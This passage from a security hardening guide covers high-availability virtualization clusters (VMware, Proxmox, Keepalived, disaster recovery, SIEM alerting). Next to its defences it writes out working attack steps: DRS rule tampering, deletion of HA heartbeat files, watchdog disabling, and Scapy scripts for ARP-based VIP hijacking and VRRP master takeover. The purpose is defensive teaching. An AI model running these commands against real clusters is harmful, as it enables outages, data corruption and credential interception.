Get-VMHostAdvancedSetting -VMHost $host -Name "das.*" | ForEach-Object {
    Write-Host "$($_.Name) = $($_.Value)"
}
```

### 5.2 DRS Rule Manipulation

DRS rules control VM placement — both affinity (keep together) and anti-affinity (keep apart). In a security context, DRS rules are the equivalent of physical cage separation in traditional datacenters.

**Categories of DRS rules and their security implications:**

| Rule Type | Example | Security Implication if Violated |
|-----------|---------|----------------------------------|
| VM-VM Anti-Affinity (Must) | DB primary + replica separation | Single host failure = total data loss |
| VM-VM Affinity (Must) | App + its sidecar/WAF | WAF bypass by separating from app |
| VM-Host Affinity (Must) | PCI workload on certified hosts only | Compliance violation, audit failure |
| VM-Host Anti-Affinity (Must) | DMZ VMs away from internal hosts | Network segmentation bypass |

**Attack scenario: DRS rule manipulation for compliance breach:**

```powershell
# Attacker with vCenter access (e.g., compromised service account)
# moves PCI-scoped VMs to non-PCI-compliant hosts

# Step 1: Identify PCI affinity rules
Get-DrsVMHostRule -Cluster $cluster | Where-Object {
    $_.Name -match "PCI|compliance|regulated"
}

# Step 2: Change rule type from MustRunOn to PreferentiallyRunOn
Set-DrsVMHostRule -Rule $pciRule -Type ShouldRunOn
# DRS can now place PCI VMs on any host

# Step 3: Trigger DRS rebalance
# Artificially load the PCI-compliant hosts to force migration
# DRS will move PCI VMs to non-compliant hosts

# Impact: PCI DSS Requirement 2.2 violation
# Workloads on non-hardened, non-audited infrastructure
```

### 5.3 vSphere HA Network Security

vSphere HA uses multiple communication channels:

1. **Management network heartbeats** (FDM on port 8182)
2. **Datastore heartbeats** (writes to `.vSphere-HA/<host-uuid>` on shared datastores)
3. **Isolation addresses** (ping targets to determine if host is isolated vs partitioned)

#### Attack: Heartbeat Datastore Manipulation

```bash
# Datastore heartbeats are files written to shared storage
# Path: /vmfs/volumes/<datastore>/.vSphere-HA/<host-uuid>/

# If attacker gains datastore access (e.g., compromised NFS):
# 1. Delete heartbeat files → host appears dead → VMs restarted elsewhere (DoS)
# 2. Write fake heartbeat files for dead host → prevents restart of its VMs
# 3. Corrupt heartbeat directory → HA agent confusion

# On NFS datastore:
rm -f /vmfs/volumes/shared-ds/.vSphere-HA/host-12345/*
# host-12345 now appears failed to FDM master
# Its VMs will be restarted on other hosts
```

**Defensive configuration:**

```powershell
# 1. Configure multiple heartbeat datastores
$cluster = Get-Cluster "Production"
$advSettings = @{
    "das.heartbeatDsPerHost" = 2  # Use 2 datastores per host
}
$advSettings.GetEnumerator() | ForEach-Object {
    New-AdvancedSetting -Entity $cluster -Name $_.Key -Value $_.Value -Force
}

# 2. Secure isolation addresses (use multiple, on different networks)
New-AdvancedSetting -Entity $cluster -Name "das.isolationAddress0" -Value "10.0.1.1" -Force
New-AdvancedSetting -Entity $cluster -Name "das.isolationAddress1" -Value "10.0.2.1" -Force
New-AdvancedSetting -Entity $cluster -Name "das.useDefaultIsolationAddress" -Value "false" -Force

# 3. Set isolation response to "Leave Powered On" for critical VMs
# (prevents attacker from using isolation to kill VMs)
Get-VM "critical-db" | Get-HARestartPolicy | Set-HARestartPolicy `
    -IsolationResponse "DoNothing"
```

### 5.4 Proactive HA Exploitation

VMware Proactive HA integrates with hardware health providers to evacuate VMs before hardware fails. This feature trusts hardware health data — making it exploitable.

**Attack: False Hardware Health Reports**

```
Attack flow:
1. Attacker compromises IPMI/BMC or hardware monitoring agent
2. Injects false "degraded" health status for target host
3. Proactive HA triggers VM evacuation from "degraded" host
4. All VMs migrate to remaining hosts (potential overload)
5. Repeat for additional hosts → cascading evacuation → DoS

# CIM-based health provider manipulation:
# ESXi uses CIM (Common Information Model) for hardware monitoring
# Port 5989 (WBEM/CIM-XML over HTTPS)
# If attacker can send fabricated CIM indications:
wbemcli -noverify ei \
    'https://root:password@esxi-host:5989/root/cimv2:CIM_NumericSensor' \
    | grep -i "CurrentReading\|OperationalStatus"
```

**Mitigation:**

```powershell
# 1. Restrict Proactive HA to verified health providers only
# 2. Set remediation to "Maintenance Mode" not "Quarantine" (less aggressive)
# 3. Require manual confirmation for Proactive HA evacuations in production
# 4. Monitor CIM provider changes

# Disable Proactive HA if not needed:
$spec = New-Object VMware.Vim.ClusterConfigSpecEx
$spec.InfraUpdateHaConfig = New-Object VMware.Vim.ClusterInfraUpdateHaConfigInfo
$spec.InfraUpdateHaConfig.Enabled = $false
$cluster.ExtensionData.ReconfigureComputeResource($spec, $true)
```

---

## 6. Proxmox HA Security

### 6.1 HA Manager and CRM Security

Proxmox HA consists of two key daemons:

- **pve-ha-lrm** (Local Resource Manager): runs on each node, executes start/stop/migrate commands
- **pve-ha-crm** (Cluster Resource Manager): runs on one node (elected master), makes all HA decisions

The CRM master is the single point of control for all HA operations. Compromising the CRM master node effectively compromises all HA-managed workloads.

#### CRM Master Election and Attack

```bash
# CRM master is elected based on corosync membership
# The node with the lowest node ID that has quorum becomes CRM master

# View current CRM master:
pvesh get /cluster/ha/status/current | grep -i master
# Or:
ha-manager status

# Attack: If attacker can manipulate corosync node IDs or
# cause specific nodes to leave/rejoin, they can influence
# which node becomes CRM master

# CRM master has authority to:
# - Start/stop any HA-managed VM
# - Migrate VMs between nodes
# - Trigger fencing of nodes
# - Change resource states

# Protection: Monitor CRM master changes
journalctl -u pve-ha-crm -f | grep "new CRM master"
```

### 6.2 Corosync Crypto with Kronosnet

Proxmox VE 7+ uses kronosnet (knet) as the Corosync transport layer, which provides built-in encryption and authentication.

```bash
# Verify current crypto configuration:
grep -E "crypto_cipher|crypto_hash" /etc/corosync/corosync.conf

# Expected output for secure configuration:
# crypto_cipher: aes256
# crypto_hash: sha256

# CRITICAL: If output shows:
# crypto_cipher: none
# crypto_hash: none
# CLUSTER COMMUNICATION IS UNENCRYPTED - IMMEDIATE REMEDIATION REQUIRED

# Enable encryption on existing cluster (requires rolling restart):
# WARNING: Plan maintenance window — this briefly disrupts cluster

# Step 1: Generate new authkey with strong entropy
corosync-keygen  # Generates /etc/corosync/authkey from /dev/urandom

# Step 2: Distribute to all nodes
for node in pve2 pve3; do
    scp /etc/corosync/authkey root@$node:/etc/corosync/authkey
    ssh root@$node "chmod 0400 /etc/corosync/authkey"
done

# Step 3: Update corosync.conf on all nodes
pvecm updatecerts

# Step 4: Rolling restart of corosync
# (One node at a time, verify quorum between restarts)
systemctl restart corosync
corosync-quorumtool -s  # Verify quorum maintained
```

### 6.3 Resource Lock Manipulation

Proxmox uses a distributed lock mechanism (based on corosync/DLM) to ensure only one node controls a resource at a time. Lock manipulation can cause dual-activation — the most dangerous HA failure mode.

**Attack: Lock Stealing for Dual-Activation**

```
Dual-activation scenario:
- VM 100 running on Node 1 (holds lock)
- Attacker causes lock release without stopping VM
- Node 2 acquires lock, starts VM 100
- BOTH nodes now run VM 100 simultaneously
- Shared storage corruption (both writing to same disk)
- Database corruption, filesystem damage, data loss

# This is the scenario fencing is designed to prevent
# But if fencing is compromised AND locks are manipulated:
# catastrophic data corruption
```

```bash
# Monitor resource locks:
ha-manager status
# Shows: <vmid> <state> <node> <request_state>

# Detect dual-activation:
# Check for same VMID running on multiple nodes
for node in $(pvecm nodes | awk 'NR>1{print $3}'); do
    ssh root@$node "qm list" 2>/dev/null
done | sort | uniq -d
# If any VMID appears twice: IMMEDIATE EMERGENCY — dual-activation detected

# Watchdog configuration (self-fencing safety net):
cat /etc/default/pve-ha-manager
# Should contain: WATCHDOG_MODULE=softdog (or ipmi_watchdog for hardware)

# Verify watchdog is active:
cat /dev/watchdog  # Should show device exists
wdctl  # Shows watchdog parameters
```

### 6.4 HA Group Exploitation

HA groups in Proxmox define which nodes can run specific resources and in what priority order.

```bash
# View HA groups:
cat /etc/pve/ha/groups.cfg

# Example configuration:
# group: production
#     nodes pve1:1,pve2:2,pve3:2
#     nofailback 0
#     restricted 1

# Security implications of group settings:
# - 'restricted 1': VM can ONLY run on group nodes (secure)
# - 'restricted 0': VM prefers group nodes but can run anywhere (risky)
# - 'nofailback 0': VM returns to preferred node when it recovers
#   (predictable movement = attacker can time attacks)

# Attack: Modify group to unrestricted, wait for failover to unprotected node
pvesh set /cluster/ha/groups/production --restricted 0
# Now VMs can land on any node, including one without security controls

# Defense: File integrity monitoring on HA configuration
inotifywait -m -r /etc/pve/ha/ -e modify -e create -e delete --format '%T %w %f %e' --timefmt '%Y-%m-%dT%H:%M:%S' |
while read timestamp dir file event; do
    logger -p auth.crit "HA CONFIG CHANGE: [$timestamp] $event $dir$file"
done &
```

### 6.5 Watchdog Timer Attacks

The software watchdog (`softdog`) or hardware watchdog (`ipmi_watchdog`) ensures a node self-fences if the HA manager stops functioning. Disabling the watchdog removes the last safety net against split-brain.

```bash
# Attack: Disable watchdog to prevent self-fencing
rmmod softdog  # Unload watchdog kernel module
# Now if this node loses quorum, it won't self-fence
# Result: Potential split-brain if node keeps running VMs

# Or: Keep feeding the watchdog while running unauthorized operations
# The watchdog expects periodic keepalives from pve-ha-lrm
# If we fake keepalives, the node never self-fences
while true; do
    echo "V" > /dev/watchdog  # Feed watchdog, prevent timeout
    sleep 5
done &

# Detection:
# 1. Monitor watchdog module loaded state
lsmod | grep -E "softdog|ipmi_wdt"
# Alert if module is not loaded

# 2. Use hardware watchdog (harder to disable from software)
# Configure IPMI watchdog in /etc/default/pve-ha-manager:
# WATCHDOG_MODULE=ipmi_watchdog

# 3. Verify watchdog timeout is appropriate
wdctl
# timeout should be ~= 2x corosync token timeout
```

### 6.6 Cluster Join Token Security

When a new node joins a Proxmox cluster, a join token is used for initial authentication. This token contains the cluster's CA certificate fingerprint and a one-time authentication key.

```bash
# Generate join information on existing cluster node:
pvecm add pve1 --print-join-info
# Output includes:
# - Cluster fingerprint
# - Join token (time-limited)
# - Expected API endpoint

# Security risks:
# 1. Token transmitted insecurely (email, chat, shared drive)
# 2. Token not time-limited in older Proxmox versions
# 3. Token reuse (if not properly invalidated after use)
# 4. Token exposure in shell history

# Hardening:
# 1. Generate token immediately before use, on secure channel
# 2. Verify cluster fingerprint out-of-band before joining
# 3. Clear shell history after join operation
history -c && history -w
# 4. Monitor for unexpected join attempts
journalctl -u pveproxy | grep -i "join\|cluster.*add"
# 5. After join, verify cluster membership matches expected
pvecm status
pvecm nodes
```

### 6.7 pvecm Security — Cluster Management Tool Hardening

```bash
# pvecm is the Proxmox cluster management CLI tool
# It can add/remove nodes, update certificates, modify cluster config

# Restrict pvecm execution to root only (default, but verify):
ls -la $(which pvecm)
# Should be: -rwxr-xr-x root root (no setuid, no world-write)

# Audit all pvecm invocations:
cat << 'EOF' >> /etc/audit/rules.d/pvecm.rules
-w /usr/bin/pvecm -p x -k cluster_management
-w /etc/corosync/ -p wa -k corosync_config
-w /etc/pve/corosync.conf -p wa -k corosync_config
-w /etc/pve/ha/ -p wa -k ha_config
EOF
augenrules --load

# Monitor for unauthorized cluster operations:
ausearch -k cluster_management --start today
```

---

## 7. Load Balancer and VIP Security

### 7.1 Virtual IP Spoofing and ARP Poisoning

Cluster services often expose a Virtual IP (VIP) that floats between nodes. The VIP is announced via Gratuitous ARP (GARP) — inherently unauthenticated on Ethernet networks.

#### Attack: VIP Hijacking via ARP Spoofing

```bash
# Scenario: Cluster VIP is 10.0.1.100 (Proxmox web UI or HA service)
# Currently held by pve1 (10.0.1.11)
# Attacker on same L2 segment

# Step 1: Send gratuitous ARP claiming VIP
arping -U -I eth0 -s 10.0.1.100 10.0.1.100 -c 5
# Or using Scapy:
python3 << 'PYEOF'
from scapy.all import *
# Gratuitous ARP: "10.0.1.100 is at <attacker-MAC>"
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=2,  # ARP Reply
    psrc="10.0.1.100",  # Claim the VIP
    hwsrc="aa:bb:cc:dd:ee:ff",  # Attacker MAC
    pdst="10.0.1.100",
    hwdst="ff:ff:ff:ff:ff:ff"
)
sendp(pkt, inter=1, count=100, iface="eth0")
PYEOF

# Result: All clients now send traffic for VIP to attacker
# Attacker can MitM the management interface, steal credentials

# Impact on HA:
# - If VIP is used for cluster communication: split-brain risk
# - If VIP is management UI: credential theft → full cluster compromise
# - If VIP is a service endpoint: data interception/manipulation
```

**Defensive measures:**

```bash
# 1. Dynamic ARP Inspection (DAI) on switch
# Validates ARP packets against DHCP snooping binding table
# (Cisco IOS example):
# ip arp inspection vlan 10
# ip arp inspection validate src-mac dst-mac ip

# 2. Static ARP entries for critical VIPs on key infrastructure
arp -s 10.0.1.100 <legitimate-mac>  # On gateway, DNS, monitoring

# 3. ARP monitoring/detection
arpwatch -i eth0 -d  # Detects ARP changes, logs flip-flops

# 4. Use separate VLAN for VIPs (restrict L2 access)
# Only cluster nodes and gateway on VIP VLAN

# 5. For Proxmox web UI: bind to management interface, not VIP
# Or use HTTPS with certificate pinning — ARP poison doesn't help
# if clients validate server certificate
```

### 7.2 Keepalived/VRRP Authentication Weaknesses

VRRP (Virtual Router Redundancy Protocol) and its Linux implementation Keepalived are commonly used for VIP failover. VRRP authentication is notoriously weak.

#### VRRP Protocol Security Issues

| VRRP Version | Auth Type | Security Level | Issue |
|--------------|-----------|----------------|-------|
| VRRPv2 | Type 0: None | None | Completely unauthenticated |
| VRRPv2 | Type 1: Simple Password | Trivial | Password in cleartext in packet |
| VRRPv2 | Type 2: HMAC-MD5 (deprecated) | Weak | MD5, removed in VRRPv3 |
| VRRPv3 | None | None | Authentication deliberately removed (rely on IPsec) |

**Attack: VRRP Master Takeover**

```bash
# Capture VRRP traffic to identify VRID and password:
tcpdump -i eth0 -nn vrrp
# VRRPv2 password is visible in plaintext in the packet!

# Takeover: Send VRRP advertisement with higher priority
# Using Scapy:
python3 << 'PYEOF'
from scapy.all import *
from scapy.contrib.vrrp import *

# VRRP advertisement with priority 255 (maximum)
# This forces master election, attacker wins
vrrp_pkt = IP(src="10.0.1.11", dst="224.0.0.18") / \
    VRRPv3(
        version=2,
        type=1,  # Advertisement
        vrid=51,  # Must match target VRID
        priority=255,  # Maximum priority
        adv=1,
        ipcount=1,
        addrlist=["10.0.1.100"]  # VIP to claim
    )
send(vrrp_pkt, inter=1, count=100, iface="eth0")
PYEOF

# Result: Attacker becomes VRRP master, holds the VIP
```

**Secure Keepalived Configuration:**

```
# /etc/keepalived/keepalived.conf — secure configuration
global_defs {
    script_user root
    enable_script_security
    # Use unicast instead of multicast (harder to sniff/inject)
    vrrp_strict
}

vrrp_instance VI_1 {
    state BACKUP  # All nodes start as BACKUP, election decides
    interface eth0
    virtual_router_id 51
    priority 100
    advert_int 1
    
    # Use unicast instead of multicast (more secure)
    unicast_src_ip 10.0.1.11
    unicast_peer {
        10.0.1.12
        10.0.1.13
    }
    
    authentication {
        auth_type AH  # IPsec Authentication Header (stronger than PASS)
        auth_pass "$(openssl rand -hex 8)"  # For VRRPv2 fallback
    }
    
    virtual_ipaddress {
        10.0.1.100/24
    }
    
    # Track interface health (prevent VIP on degraded node)
    track_interface {
        eth0 weight -50
        eth1 weight -50
    }
    
    # Notification scripts for monitoring
    notify_master "/usr/local/bin/vrrp-notify.sh MASTER"
    notify_backup "/usr/local/bin/vrrp-notify.sh BACKUP"
    notify_fault "/usr/local/bin/vrrp-notify.sh FAULT"
}
```

### 7.3 HAProxy/Nginx Frontend Security

When HAProxy or Nginx fronts the cluster management UI (common in enterprise deployments), misconfigurations create authentication bypass vectors.

```nginx
# INSECURE: Proxying Proxmox UI without proper security headers
upstream pve {
    server 10.0.1.11:8006;
    server 10.0.1.12:8006;
    server 10.0.1.13:8006;
}

# SECURE: HAProxy configuration for Proxmox management UI
# /etc/haproxy/haproxy.cfg
frontend pve_management
    bind *:443 ssl crt /etc/haproxy/certs/pve-mgmt.pem \
        ca-file /etc/haproxy/certs/ca.pem verify required \
        crt-ignore-err all \
        alpn h2,http/1.1
    
    # Client certificate authentication (mTLS)
    acl valid_client ssl_c_verify 0
    http-request deny unless valid_client
    
    # Rate limiting
    stick-table type ip size 100k expire 30s store http_req_rate(10s)
    http-request track-sc0 src
    http-request deny deny_status 429 if { sc_http_req_rate(0) gt 50 }
    
    # Security headers
    http-response set-header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
    http-response set-header X-Content-Type-Options "nosniff"
    http-response set-header X-Frame-Options "DENY"
    http-response set-header Content-Security-Policy "default-src 'self'"
    
    # IP allowlist for management access
    acl allowed_mgmt src 10.0.0.0/16
    http-request deny unless allowed_mgmt
    
    default_backend pve_nodes

backend pve_nodes
    balance roundrobin
    option httpchk GET /api2/json/version
    http-check expect status 401  # API returns 401 without auth = healthy
    
    server pve1 10.0.1.11:8006 ssl verify required ca-file /etc/pve/pve-root-ca.pem check inter 5s
    server pve2 10.0.1.12:8006 ssl verify required ca-file /etc/pve/pve-root-ca.pem check inter 5s
    server pve3 10.0.1.13:8006 ssl verify required ca-file /etc/pve/pve-root-ca.pem check inter 5s
```

### 7.4 BGP Hijacking of Cluster Service IPs

In environments where cluster services are announced via BGP (common in large-scale deployments with anycast or multi-site services), BGP hijacking enables redirection of all traffic to attacker infrastructure.

**Attack Scenario:**

```
Legitimate AS announces: 203.0.113.0/24 (contains cluster VIPs)
Attacker announces: 203.0.113.0/25 (more specific prefix = wins)

Result: All traffic for cluster VIPs routes to attacker
- Service impersonation
- Credential harvesting
- Certificate warnings (if clients validate)
```

**Defensive measures:**

```bash
# 1. RPKI (Resource Public Key Infrastructure)
# Sign your route origin authorizations (ROAs)
# Reject RPKI-invalid routes from peers

# 2. BGP prefix filtering with exact-match
# Only accept your own prefixes from your own AS
# (Router configuration example - Quagga/FRR):
# ip prefix-list CLUSTER-VIPs seq 10 permit 203.0.113.0/24 le 24
# route-map BGP-OUT permit 10
#   match ip address prefix-list CLUSTER-VIPs

# 3. Monitor BGP announcements
# Use BGP monitoring tools (RIPE RIS, BGPStream)
# Alert on unexpected origin AS changes for your prefixes

# 4. For internal services: avoid BGP for VIPs
# Use Layer 2 mechanisms (GARP/VRRP) within isolated management VLAN
```

---

## 8. Disaster Recovery Security

### 8.1 DR Failover Authentication

Disaster Recovery introduces site-to-site trust relationships. The authentication mechanisms governing DR failover are critical — an attacker who triggers unauthorized DR failover can redirect production traffic to a compromised recovery site.

#### Site-to-Site Trust Models

| DR Solution | Auth Mechanism | Risk if Compromised |
|-------------|----------------|---------------------|
| Proxmox Backup Server (PBS) | API tokens + TLS fingerprint verification | Backup data exfiltration, corrupt restores |
| Veeam B&R | Service account credentials + TLS | Full backup access, restore manipulation |
| Zerto | ZVM authentication + site pairing keys | Replication redirection, failover manipulation |
| VMware SRM | vCenter linked mode + SRM certificates | Unauthorized site recovery, workload theft |
| Proxmox Remote Replication | SSH keys + API tokens | Data exfiltration via replication stream |

```bash
# Proxmox remote replication — secure configuration
# On source node (primary site):
# Create dedicated replication user with minimal permissions
pveum user add repl@pve --password "$(openssl rand -base64 32)"
pveum aclmod / -user repl@pve -role PVEVMAdmin  # Minimum needed
pveum aclmod /storage -user repl@pve -role PVEDatastoreUser

# Set up SSH key-based auth for replication (no password in config)
ssh-keygen -t ed25519 -N "" -f /root/.ssh/replication_key -C "replication-only"
# Copy to DR site with restricted authorized_keys options:
# On DR site /root/.ssh/authorized_keys:
# restrict,command="/usr/sbin/pvesr" ssh-ed25519 AAAA... replication-only

# TLS fingerprint verification (prevent MitM on replication channel):
pvesh get /nodes/dr-node/status --fingerprint "SHA256:xxxx..."
```

### 8.2 Replication Traffic Encryption

All replication traffic must be encrypted in transit. Unencrypted replication = complete data exposure to network-level attackers.

```bash
# Proxmox Backup Server — verify TLS configuration:
cat /etc/proxmox-backup/proxy.cfg
# Should show: certificate pinning, TLS 1.2+ only

# Test replication encryption from network:
# Capture replication traffic and verify it's encrypted
tcpdump -i eth0 -w /tmp/repl_capture.pcap host dr-site-ip
# In Wireshark: Protocol should show TLSv1.2/1.3
# If you see plaintext VM disk data: CRITICAL vulnerability

# Veeam replication — enforce encryption:
# In Veeam console: Backup Infrastructure → Managed Servers
# For each proxy: Enable "Encrypt data during transfer"
# For WAN accelerators: Always enabled by default

# Zerto — verify encryption:
# ZVM → Settings → Policies
# Ensure "Encrypt VPG data at rest and in transit" is enabled
# Verify TLS 1.2+ on ZVM-to-ZVM communication (port 9081)
openssl s_client -connect dr-zvm:9081 -tls1_2
```

### 8.3 RPO/RTO Manipulation Attacks

**Attack: Corrupting Recovery Point Objective by manipulating replication lag**

If an attacker can introduce artificial delays or corrupt recent replication data, the effective RPO increases far beyond what the organization believes.

```
Attack scenario — "RPO Inflation":
1. Attacker gains access to replication network
2. Introduces packet loss/corruption on replication channel
3. Replication falls behind (lag increases)
4. Organization believes RPO = 15 minutes (configured)
5. Actual RPO = 4 hours (due to attacker-induced lag)
6. Primary site suffers failure
7. DR site recovery: 4 hours of data lost (not 15 minutes)
8. Attacker achieves data destruction beyond expected RPO

# Detection:
# Monitor replication lag vs configured RPO
# Alert when actual lag > 2x configured RPO
```

```bash
# Proxmox replication lag monitoring:
pvesh get /cluster/replication
# Check 'last_sync' timestamp vs current time

# Automated RPO compliance check:
cat << 'EOF' > /usr/local/bin/rpo-monitor.sh
#!/bin/bash
MAX_RPO_SECONDS=900  # 15 minutes
CURRENT_TIME=$(date +%s)

pvesh get /cluster/replication --output-format json | \
    jq -r '.[] | "\(.guest) \(.last_sync)"' | \
while read vmid last_sync; do
    LAG=$((CURRENT_TIME - last_sync))
    if [ "$LAG" -gt "$MAX_RPO_SECONDS" ]; then
        logger -p auth.warning \
            "RPO VIOLATION: VM $vmid - lag ${LAG}s (max ${MAX_RPO_SECONDS}s)"
    fi
done
EOF
chmod +x /usr/local/bin/rpo-monitor.sh
# Run every 5 minutes via cron/systemd timer
```

### 8.4 Backup Integrity Verification Before DR Activation

**Never activate DR from unverified backups.** A compromised backup that passes superficial validation can introduce backdoors, ransomware, or data corruption into the recovery environment.

```bash
# Proxmox Backup Server — verify backup integrity:
# 1. Cryptographic verification of backup chunks
proxmox-backup-client verify --repository dr-pbs:backup-store \
    --backup-id vm/100 \
    --backup-time "2026-05-07T12:00:00Z"

# 2. Mount and scan backup before restore (offline scan):
proxmox-backup-client mount \
    --repository dr-pbs:backup-store \
    --archive drive-scsi0.img.fidx \
    --target /mnt/verify \
    --backup-id vm/100

# Run antimalware scan on mounted backup:
clamscan -r /mnt/verify/
# Or YARA rules for known malware signatures:
yara -r /opt/yara-rules/malware/ /mnt/verify/

# 3. Hash comparison between source and backup:
# On source (before disaster): generate filesystem hashes
find / -xdev -type f -exec sha256sum {} \; > /backup/source_hashes.txt
# After restore: compare
sha256sum --check /backup/source_hashes.txt | grep -v ": OK$"

# 4. Automated restore testing (monthly):
# Restore to isolated network, verify application functionality
# Document successful verification with timestamp
```

**Veeam SureBackup equivalent:**

```powershell
# VMware + Veeam: Automated backup verification
# SureBackup job verifies VM boots, applications respond
# Add custom scripts for:
# - File integrity checks
# - Database consistency verification
# - Network service availability
# - Known-bad indicator scanning (YARA/Sigma)
```

---

## 9. Monitoring HA Security Events

### 9.1 Cluster Event Correlation in SIEM

HA security events are meaningless in isolation — their significance emerges from correlation. A single node restart is normal; three node restarts in sequence preceded by IPMI authentication from an unusual IP is an attack.

#### Key HA Events to Forward to SIEM

| Event Category | Source | Log Location | Significance |
|----------------|--------|--------------|--------------|
| Membership change | Corosync | `/var/log/corosync/corosync.log` | Node join/leave — possible rogue node |
| Quorum change | Corosync | `journalctl -u corosync` | Vote count delta — possible injection |
| CRM master change | pve-ha-crm | `journalctl -u pve-ha-crm` | HA control transfer — possible takeover |
| Resource migration | pve-ha-lrm | `/var/log/pve/ha-manager/current` | Unexpected VM movement |
| Fencing event | STONITH agent | `journalctl -u pve-ha-lrm` | Node killed — possible attack |
| Watchdog trigger | kernel | `dmesg`, `/var/log/kern.log` | Self-fence — node lost cluster |
| Config change | pmxcfs | `/var/log/pve/pvedaemon.log` | HA config modification |
| IPMI auth | BMC log | BMC event log (via ipmi-sel) | Fencing credential usage |

#### Rsyslog Configuration for HA Event Forwarding

```bash
# /etc/rsyslog.d/90-ha-security.conf

# Forward Corosync events
:programname, isequal, "corosync" @@siem.internal:514;RSYSLOG_SyslogProtocol23Format

# Forward HA manager events
:programname, isequal, "pve-ha-crm" @@siem.internal:514;RSYSLOG_SyslogProtocol23Format
:programname, isequal, "pve-ha-lrm" @@siem.internal:514;RSYSLOG_SyslogProtocol23Format

# Forward fencing events
:msg, contains, "fencing" @@siem.internal:514;RSYSLOG_SyslogProtocol23Format
:msg, contains, "stonith" @@siem.internal:514;RSYSLOG_SyslogProtocol23Format

# Forward watchdog events
:msg, contains, "watchdog" @@siem.internal:514;RSYSLOG_SyslogProtocol23Format

# Forward cluster config changes
:msg, contains, "pmxcfs" @@siem.internal:514;RSYSLOG_SyslogProtocol23Format
```

### 9.2 Detecting Unauthorized Failovers and Node Changes

```bash
# Sigma rule: Unauthorized Cluster Node Addition
# (for SIEM platforms supporting Sigma format)
cat << 'EOF'
title: Unauthorized Cluster Node Addition
id: 8a5b2c3d-4e5f-6789-abcd-ef0123456789
status: experimental
description: Detects new node joining the Proxmox cluster outside maintenance window
author: Security Team
date: 2026-05-07
logsource:
    product: proxmox
    service: corosync
detection:
    selection:
        EventType: membership_change
        Action: join
    filter_maintenance:
        TimeRange|within: "maintenance_window"
    condition: selection and not filter_maintenance
level: high
tags:
    - attack.persistence
    - attack.t1078
EOF

# Sigma rule: Rapid Sequential Fencing Events
cat << 'EOF'
title: Rapid Sequential Fencing Events - Possible Attack
id: 9b6c3d4e-5f6a-7890-bcde-f01234567890
status: experimental
description: Multiple fencing events within short timeframe indicate possible weaponized fencing attack
author: Security Team
date: 2026-05-07
logsource:
    product: proxmox
    service: ha-manager
detection:
    selection:
        EventType: fencing
    timeframe: 5m
    condition: selection | count() > 1
level: critical
tags:
    - attack.impact
    - attack.t1489
EOF

# Elasticsearch query for suspicious HA activity:
# (Kibana/OpenSearch DSL)
cat << 'EOF'
{
  "query": {
    "bool": {
      "must": [
        {"range": {"@timestamp": {"gte": "now-1h"}}},
        {"bool": {
          "should": [
            {"match_phrase": {"message": "node joined"}},
            {"match_phrase": {"message": "fencing node"}},
            {"match_phrase": {"message": "quorum lost"}},
            {"match_phrase": {"message": "new CRM master"}},
            {"match_phrase": {"message": "resource migration"}}
          ]
        }}
      ]
    }
  },
  "aggs": {
    "event_timeline": {
      "date_histogram": {
        "field": "@timestamp",
        "fixed_interval": "1m"
      }
    }
  }
}
EOF
```

### 9.3 Alerting on Quorum Changes and Split-Brain

```bash
# Real-time quorum monitoring script with alerting
cat << 'EOF' > /usr/local/bin/quorum-security-monitor.sh
#!/bin/bash
# Quorum Security Monitor — run as systemd service
# Detects: quorum changes, split-brain indicators, unexpected votes

EXPECTED_VOTES=3
EXPECTED_NODES="pve1 pve2 pve3"
ALERT_WEBHOOK="https://alertmanager.internal/api/v1/alerts"
LOG_TAG="quorum-security"

while true; do
    # Get current quorum status
    QUORUM_OUTPUT=$(corosync-quorumtool -s 2>/dev/null)
    
    if [ $? -ne 0 ]; then
        logger -p auth.crit -t "$LOG_TAG" "CRITICAL: Cannot query quorum - corosync may be down"
        # Alert
        curl -s -X POST "$ALERT_WEBHOOK" \
            -H "Content-Type: application/json" \
            -d "[{\"labels\":{\"alertname\":\"CorosyncDown\",\"severity\":\"critical\",\"node\":\"$(hostname)\"}}]"
        sleep 10
        continue
    fi
    
    # Check vote count
    CURRENT_VOTES=$(echo "$QUORUM_OUTPUT" | grep "Total votes" | awk '{print $3}')
    if [ "$CURRENT_VOTES" != "$EXPECTED_VOTES" ]; then
        logger -p auth.crit -t "$LOG_TAG" \
            "ALERT: Vote count changed! Expected=$EXPECTED_VOTES Got=$CURRENT_VOTES"
        curl -s -X POST "$ALERT_WEBHOOK" \
            -H "Content-Type: application/json" \
            -d "[{\"labels\":{\"alertname\":\"QuorumVoteChange\",\"severity\":\"critical\",\"expected\":\"$EXPECTED_VOTES\",\"actual\":\"$CURRENT_VOTES\"}}]"
    fi
    
    # Check quorate status
    IS_QUORATE=$(echo "$QUORUM_OUTPUT" | grep "Quorate" | grep -c "Yes")
    if [ "$IS_QUORATE" -eq 0 ]; then
        logger -p auth.emerg -t "$LOG_TAG" "EMERGENCY: Cluster lost quorum!"
        curl -s -X POST "$ALERT_WEBHOOK" \
            -H "Content-Type: application/json" \
            -d "[{\"labels\":{\"alertname\":\"QuorumLost\",\"severity\":\"page\",\"node\":\"$(hostname)\"}}]"
    fi
    
    # Check for unexpected nodes
    CURRENT_NODES=$(corosync-quorumtool -l 2>/dev/null | grep -oP 'Nodeid\s+\d+\s+\K\S+')
    for node in $CURRENT_NODES; do
        if ! echo "$EXPECTED_NODES" | grep -qw "$node"; then
            logger -p auth.crit -t "$LOG_TAG" "ALERT: Unknown node in cluster: $node"
            curl -s -X POST "$ALERT_WEBHOOK" \
                -H "Content-Type: application/json" \
                -d "[{\"labels\":{\"alertname\":\"UnknownClusterNode\",\"severity\":\"critical\",\"node\":\"$node\"}}]"
        fi
    done
    
    sleep 30
done
EOF
chmod +x /usr/local/bin/quorum-security-monitor.sh

# Systemd service for the monitor:
cat << 'EOF' > /etc/systemd/system/quorum-security-monitor.service
[Unit]
Description=Quorum Security Monitor
After=corosync.service
Requires=corosync.service

[Service]
ExecStart=/usr/local/bin/quorum-security-monitor.sh
Restart=always
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target
EOF
systemctl enable --now quorum-security-monitor.service
```

### 9.4 Audit Trail for HA Configuration Changes

Every HA configuration change must be attributed, timestamped, and preserved in tamper-resistant storage.

```bash
# 1. Auditd rules for HA configuration files
cat << 'EOF' > /etc/audit/rules.d/50-ha-security.rules
# Corosync configuration
-w /etc/corosync/corosync.conf -p wa -k ha_corosync_config
-w /etc/corosync/authkey -p ra -k ha_authkey_access

# Proxmox HA configuration (on pmxcfs)
